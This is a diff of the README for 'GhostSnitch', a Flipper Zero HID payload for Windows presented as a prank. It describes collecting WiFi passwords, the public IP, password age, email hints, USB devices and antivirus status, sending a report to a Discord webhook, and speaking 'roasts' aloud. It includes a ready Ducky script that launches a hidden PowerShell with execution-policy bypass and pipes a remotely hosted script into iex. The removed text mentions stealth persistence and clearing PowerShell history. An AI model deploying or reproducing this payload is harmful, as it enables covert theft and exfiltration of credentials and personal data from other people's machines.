@@ -1,95 +1,56 @@
-# 👻 GhostSnitch
+# GhostSnitch
 
-**Version:** 1.0  
+**Version:** 1.2  
 **Author:** I am TBJr  
-**Platform:** Windows (7, 10, 11)  
-**Delivery:** HID (Flipper Zero, USB Rubber Ducky, or manually via PowerShell)
+**Platform:** Windows 10 / 11  
+**Delivery:** Flipper Zero HID (`irm | iex`)
 
 ---
 
-## 🧠 What is GhostSnitch?
+## What it does
 
-GhostSnitch is a **powerful prank payload** designed for use with **Flipper Zero** or other HID attack vectors. It collects light reconnaissance data from a Windows machine, then uses speech synthesis to roast the user based on their setup, and changes the desktop wallpaper to a steganographic image with a hidden message.
-
-Once executed, it installs itself to run **stealthily on system startup**, ensuring the roast can live on...
+Collects recon data from a Windows machine, waits for mouse movement, then roasts the user over TTS and changes the desktop wallpaper. Optionally sends a full report to a Discord webhook.
 
 ---
 
-## 🎯 Features
+## Features
 
-- 🔎 Gathers:
-    - RAM capacity
-    - Public IP
-    - WiFi SSID & passwords
-    - Password age
-    - Connected email (if present)
-- 🎤 Roasts the user using Windows' text-to-speech
-- 🖼️ Changes wallpaper with a hidden stego message
-- 👣 Waits for mouse movement before starting
-- 🛠️ Installs itself with a scheduled task for persistence
-- 🧹 Cleans up visual evidence (PowerShell history, temp files)
+- Collects: RAM, public IP, WiFi SSID + password (admin only), password age, email hint, OS, uptime, drives, recent files, USB devices, BitLocker status, top processes, antivirus
+- All data gathered once and reused for both the Discord report and TTS — no duplicate execution
+- Waits for mouse movement before speaking (roast fires when the user is active)
+- Generates a roast wallpaper at native screen resolution via GDI+
+- Optional Discord webhook report (skipped when `$webhookUrl` is left as `REPLACE_ME`)
+- No persistence — runs once and exits
 
----
+## Setup
 
-## 🚀 How to Use
+1. Open `host/GhostSnitch.ps1`
+2. Set `$webhookUrl = 'https://discord.com/api/webhooks/...'` at the top (or leave `REPLACE_ME` to disable reporting)
+3. Host the file on GitHub Pages (or your own server)
+4. Update the URL in `GhostSnitch.txt` if you changed the host
 
-### Option 1: Manually on Windows
-1. Download the script:
-    ```powershell
-    iwr https://raw.githubusercontent.com/<your-username>/ghostsnitch/main/GhostSnitch_Stego.ps1 | iex
-    ```
+## Ducky script
 
-2. Sit back and enjoy the roast.
-
----
-
-### Option 2: Flipper Zero / HID Payload
-Create a Ducky Script file named `GhostSnitch.txt`:
-
-```ducky
-REM GhostSnitch Flipper Payload
-REM Author: I am TBJr
-
+```
 GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/<your-username>/ghostsnitch/main/GhostSnitch_Stego.ps1 | iex
+DELAY 600
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://tbjr.github.io/Flipper-payloads/host/GhostSnitch.ps1 | iex
 ENTER
 ```
-Then copy it to your Flipper’s payloads folder and deploy it.
 
-## 🧬 Example Roast
-- 8 GB of RAM? Gamer vibes... if lag was a feature.
-- Your public IP is 103.45.231.5. Say hi to the world for me.
-- That password: hunter123 ... it's crying for help.
-- Changed your password 180 days ago? That password's got mold on it.
-- Gmail user? Stylish. But your inbox is probably chaos.
+## Known limitations
 
-## 🖼️ Wallpaper with Hidden Message
-The script generates a wallpaper that displays a roast message and appends a hidden line like:
-```
-StegoMessage: Curiosity sparked the fire. Satisfaction burned the cat.
-```
+- **WiFi password** requires Administrator — GhostSnitch runs as the current user and gracefully reports the limitation if not elevated. Use GhostSnitch_Stealth for auto-elevation.
+- **Group Policy** can block wallpaper changes on managed/corporate machines.
+- **Windows Defender** may flag `netsh … key=clear` or the scheduled task pattern; no AMSI bypass is included.
 
-## 📂 Files
-- GhostSnitch_Stego.ps1: Main prank script with persistence + wallpaper steganography 
-- GhostSnitch.txt: Flipper-ready Ducky Script HID payload 
-- README.md: Project documentation
+## Example roasts
 
-## ⚠️ Disclaimer
-This tool is for educational and entertainment purposes only. Do not deploy it without explicit consent from the machine owner. Unauthorized use may violate local laws or regulations.
+- `8 GB? Gamer vibes... if lag was a feature.`
+- `Your public IP is 1.2.3.4. Say hi to the world for me.`
+- `hunter2 … it's crying for help.`
+- `180 days? That password's got mold on it.`
 
-## 🙌 Acknowledgements
-Inspired by the classic hacker spirit: “My crime is that of curiosity.”
----
+## Credits
 
-## 🙏 Credits
-
-This project is inspired by the original prank script **AcidBurn** by [I am Jakoby](https://github.com/I-Am-Jakoby).
-
-GhostSnitch builds upon his idea with enhancements including:
-- Refined roast logic
-- Stealth persistence
-- Steganographic wallpaper generation
-- Flipper Zero HID deployment support
-
-Much respect to the OG 🙌
+Inspired by AcidBurn by [I am Jakoby](https://github.com/I-Am-Jakoby). Extended by **TBJr**.
